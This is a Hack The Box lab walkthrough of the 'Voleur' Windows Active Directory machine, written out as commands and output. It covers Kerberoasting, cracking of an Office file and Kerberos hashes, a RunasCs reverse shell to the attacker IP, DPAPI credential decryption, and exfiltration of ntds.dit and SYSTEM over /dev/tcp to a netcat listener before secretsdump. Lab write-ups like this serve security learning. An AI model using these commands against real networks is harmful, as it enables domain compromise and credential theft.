- - - 
created : 23-09-2025 

Tags : #medium 

Released on 05 Jul 2025 (Season 8)
- - - 
# Machine Information

As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account:

`ryan.naylor / HollowOct31Nyt`

# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur]
└─$ rustscan -a voleur.htb -- -A

Open 10.10.11.76:53
Open 10.10.11.76:88
Open 10.10.11.76:135
Open 10.10.11.76:139
Open 10.10.11.76:389
Open 10.10.11.76:445
Open 10.10.11.76:464
Open 10.10.11.76:593
Open 10.10.11.76:636
Open 10.10.11.76:2222
Open 10.10.11.76:3268
Open 10.10.11.76:3269
Open 10.10.11.76:5985
Open 10.10.11.76:9389
Open 10.10.11.76:49664
Open 10.10.11.76:49668
Open 10.10.11.76:65121
Open 10.10.11.76:65120
Open 10.10.11.76:65133
Open 10.10.11.76:65138
Open 10.10.11.76:65151

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-23 20:38:39Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65120/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
65121/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65133/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65138/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65151/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)

Host script results:
| smb2-time: 
|   date: 2025-09-23T20:39:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48495/tcp): CLEAN (Timeout)
|   Check 2 (port 49360/tcp): CLEAN (Timeout)
|   Check 3 (port 60782/udp): CLEAN (Timeout)
|   Check 4 (port 21812/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

We have [Windows](../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md). we add Add `dc.voleur.htb`to our `/etc/hosts` file.
# Enumeration

Since we aren't able to use password authentication directly, we can try to request a ticket.

First update time:

```bash
$ sudo timedatectl set-ntp off
$ sudo rdate -n 10.10.11.76
Tue Sep 23 23:12:24 CEST 2025
```

We request the certificate:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache

$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Voleur/user/ryan.naylor.ccache

nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt  
```

Now collect with [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -ns 10.10.11.76 -c All -d voleur.htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 16S
INFO: Compressing output into 20250923231923_bloodhound.zip
```

We open the GUI and upload:

![Pasted image 20250923232129.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250923232129.png)

Then search for paths:

![Pasted image 20250923232745.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250923232745.png)

![Pasted image 20250923232903.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250923232903.png)

![Pasted image 20250923233040.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250923233040.png)

So we are member of this `Technicians` group but we don't have special permissions.
## SMB (445)
### NetExec

We have to try the given credentials for files, we can use [NetExec](../../../3%20-%20Tags/Hacking%20Tools/NetExec.md): 

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ netexec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares --smb-timeout 500 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

We have an `IT` share we connect with `impacket`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ impacket-smbclient -k dc.voleur.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 22:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 10:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
-rw-rw-rw-      16896  Fri May 30 00:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
```

Now we bruteforce the password with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ office2john Access_Review.xlsx > hash                                                                                                               
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt          
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:01 DONE (2025-09-23 23:36) 0.5714g/s 493.7p/s 493.7c/s 493.7C/s football1..felipe
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now we can open the file with `libreoffice`:

```bash
$ sudo apt install libreoffice-calc -y
```

![Pasted image 20250923235048.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250923235048.png)

Notice that the `Todd` user was deleted, but the password was left: `NightT1meP1dg3on14` 
# Exploit

We found passwords for other users:
 
```bash
svc_ldap: M1XyC9pW7qT5Vn
svc_iis: N5pXyW1VqM7CZ8 # Not used
```

![Pasted image 20250924000139.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250924000139.png)


So `svc_ldap` has `GenericWrite` permission to `Lacey.Miller`, and `WriteSPN` has permission on `svc_winrm`.

Let's request a ticket for `svc_ldap`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Voleur/user/svc_ldap.ccache
```
## TargetedKerberoast

We can use this tool named [TargetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md)

Clone the repo:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/]
└─$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Clone in 'targetedKerberoast' in corso...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 18 (delta 14), pack-reused 43 (from 1)
Ricezione degli oggetti: 100% (76/76), 252.27 KiB | 247.00 KiB/s, fatto.
Risoluzione dei delta: 100% (30/30), fatto.
```

Now make a `venv` and install requirements:

```bash
─$ python3 -m venv .venv
─$ source .venv/bin/activate
─$ pip3 install -r requirements.txt
Collecting ldap3 (from -r requirements.txt (line 1))
  Downloading ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
Collecting pyasn1 (from -r requirements.txt (line 2))
  Downloading pyasn1-0.6.1-py3-none-any.whl.metadata (8.4 kB)
Collecting impacket (from -r requirements.txt (line 3))
  Downloading impacket-0.12.0.tar.gz (1.6 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.6/1.6 MB 3.3 MB/s  0:00:01
     <SNIP>
```

Now use it:

```bash
┌──(.venv)─(mdn0x㉿mdn0xKali)-[~/…/Voleur/user/tools/targetedKerberoast]
└─$ python targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb           
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$ed52477f0d5d928299a98b15b30b14a3$adf8fc5dc32628a90b19b3182ce5afd0dba6e58df29383eccbb3bc6e573a1e2400cae80f41192df9bd7384c99bc22269a6913ed0375b03ede5fe3240f6ab06edb0de661006fabbaa095d7ec3d68b2b803a963544260b662471a8dd454580051e3310370e6ad68f3d5fe6070fd41b0239ae282bd208e90c45de722b0b445296044d5816c2c410d8bf658e4c1935a9fe61cc4461b0a47d3be7d80ab24fc3cae43c76612242517e792166233c051849184ce842fa44bd6c09e7c61ccda49900bc289750c8c4eeaa6c047461e265af396adfc4491c6e5558077037b8a1a57bb7b9f86930414254b162ccd1cc46f3a5d25359b0de2ae732fb456f0a2a630ed4b4af3371fa52fd9733<SNIP>
+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$68e06123d429f9ca998930150a3c3b0b$72368482484209c93b79a42e26dac0954677cef6<SNIP>
```

We can `deactivate` the virtual environment:

```bash
─$ deactivate 
```
## John The Ripper

We can save with [Nano](../../../3%20-%20Tags/Hacking%20Tools/Nano.md) and crack the hashes with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md):

```bash
$ nano laceyhash                                                                                                                     
$ nano svc_winrm_hash
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/user]
└─$ john svc_winrm_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:02 DONE (2025-09-24 00:11) 0.4016g/s 4608Kp/s 4608Kc/s 4608KC/s AHANACK6978012..ADDRESS1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Let's request a ticket for `svc_winrm`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Voleur/user/tickets]
└─$ impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache

-$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Voleur/user/tickets/svc_winrm.ccache 
```

## Evil-WinRM

Now we can use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) again to access with the kerberos ticket and `type` the user flag:

```powershell
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Voleur/user/tickets]
└─$ evil-winrm -i dc.voleur.htb -k svc_winrm.ccache -r voleur.htb   

*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_winrm> cd Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
  HTB{{REDACTED_FLAG}}
```
### Errors Debugging

If you have this response:

```bash
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information                                                    
Cannot find KDC for realm "VOLEUR.HTB"                                                                               

Error: Exiting with code 1
```

Install `krb5`:

```bash
sudo apt install -y krb5-user libsasl2-modules-gssapi-mit
```

Use `klist`:

```bash
─$ klist                                                    
Ticket cache: FILE:/home/mdn0x/HTB/Machines/Voleur/user/tickets/svc_winrm.ccache
Default principal: svc_winrm@VOLEUR.HTB

Valid starting       Expires              Service principal
24/09/2025 01:53:04  24/09/2025 11:53:04  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 25/09/2025 01:53:04
```

Modify config file in this way:

```json
-$ sudo nano /etc/krb5.conf

<SNIP>
             admin_server = kerberos1.utoronto.ca
                default_domain = utoronto.ca
        }
        VOLEUR.HTB = {
                kdc = dc.voleur.htb
                admin_server = dc.voleur.htb
                default_domain = voleur.htb
        }

[domain_realm]
        .mit.edu = ATHENA.MIT.EDU
        mit.edu = ATHENA.MIT.EDU
        .media.mit.edu = MEDIA-LAB.MIT.EDU
        media.mit.edu = MEDIA-LAB.MIT.EDU
        .csail.mit.edu = CSAIL.MIT.EDU
        csail.mit.edu = CSAIL.MIT.EDU
        .whoi.edu = ATHENA.MIT.EDU
        whoi.edu = ATHENA.MIT.EDU
        .stanford.edu = stanford.edu
        .slac.stanford.edu = SLAC.STANFORD.EDU
        .toronto.edu = UTORONTO.CA
        .utoronto.ca = UTORONTO.CA
       .voleur.htb = VOLEUR.HTB
        voleur.htb = VOLEUR.HTB
```

Now export again the key and then use `evil-winrm`.
# Lateral Movement -Privilege Escalation
## svc_ldap/svc_winrm to Todd

We remember about user `Todd` , and that `svc_ldap`belongs to `RESTORE_USERS` group.
### RunasCs.exe

Try using `RunasCs` to switch users (because svc_ldap is not in the remote group and cannot log in directly):

https://github.com/antonioCoco/RunasCs.git

Clone the repo:

```bash
git clone https://github.com/antonioCoco/RunasCs.git 
```

Now we can transfer:

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload /home/your_path/Voleur/tools/RunasCs.exe
```

Open [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener:

```bash
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

Execute:

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.73:1337
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1152d47$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 172 created in background.
```
### Restore User 

We have the shell has `svc_ldap` on the listener:

```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
```

Now we can restore the `Todd` user:

1. Query deleted users
```powershell
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

2.  Restore
```powershell
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
```

3. Verify
```powershell
PS C:\Windows\system32> net user /domain                                                                             
net user /domain                                                                                                     
                                                                                                                     
User accounts for \\DC                                                                                               
                                                                                                                     
-------------------------------------------------------------------------------                                      
Administrator            krbtgt                   svc_ldap                                                           
todd.wolfe                                                                                                           
The command completed successfully.        
```
## Todd to Jeremy

### DPAPI
#### Bloodhound 

We can collect again and see about `todd`:

```bash
─$ bloodhound-python -u svc_winrm  -p AFireInsidedeOzarctica980219afi -ns 10.10.11.76 -c All -d voleur.htb --zip 
```

![Pasted image 20250924040827.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250924040827.png)

We find that he belongs to the `SECOND LINE TECHNICIANS` group, we can return on [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) to check the shares.
#### Impacket

First we obtain a key for this user:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Voleur/root/tickets]
└─$ impacket-getTGT voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Voleur/root/tickets/todd.wolfe.ccache 
```

Now we can use it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Voleur/root/tickets]
└─$ impacket-smbclient -k dc.voleur.htb                     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 22:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 15:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 16:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 13:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 13:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 13:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Videos
```

We try to get `dpapi` encrypted data and keys:

``` bash
# get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88

# get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
```
#### Cracking

We can crack the key:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Voleur/root/tickets]
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Now we crack the user credentials:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Voleur/root/tickets]
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```
## Jeremy to svc_backup
### Bloodhound AGAIN

We need the new ticket:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Voleur/root/tickets]
└─$ impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m'  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Voleur/root/tickets/jeremy.combs.ccache 
```

Now we collect:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/root]
└─$ bloodhound-python -u jeremy.combs -p qT3V9pLXyN7W4m -k -ns 10.10.11.76 -c All -d voleur.htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 14S
INFO: Compressing output into 20250924043638_bloodhound.zip
```

Check the GUI graphs:

![Pasted image 20250924044039.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250924044039.png)

`Jeremy` is member of the `THIRD-LINE TECHNICIANS` group.
### SMB

We can check the folder:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Voleur/root/tickets]
└─$ impacket-smbclient -k dc.voleur.htb                         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT 
# ls
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 22:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 17:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 17:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 17:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 17:07:35 2025 Note.txt.txt
# get id_rsa
# get Note.txt.txt
# exit                                                             
```

We read `Note.txt.txt`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/root]
└─$ cat Note.txt.txt 
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin                    
```
### SSH

We can see the `id_rsa` key for [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) is for the user `svc_backup`, and we have port `2222` on the scan:

```bash
─$ chmod 600 id_rsa 

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/root]
└─$ ssh -i id_rsa svc_backup@voleur.htb
```
## svc_backup to Administrator
### Secrets Dump 

We can find the `SYSTEM` and `NTDS` files let's grab them with a listener:

```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ cat SYSTEM  > /dev/tcp/10.10.14.73/4444
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ cd ..
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd Active\ Directory/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$  cat ntds.dit > /dev/tcp/10.10.14.73/4444
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/root]
└─$ nc -lvnp 4444 > SYSTEM
listening on [any] 4444 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.11.76] 53423

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/root]
└─$ nc -lvnp 4444 > ntds.dit
listening on [any] 4444 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.11.76] 53430
```
### Cracking 

We use `Impacket` function to crack the hashes:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Voleur/root]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM local 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
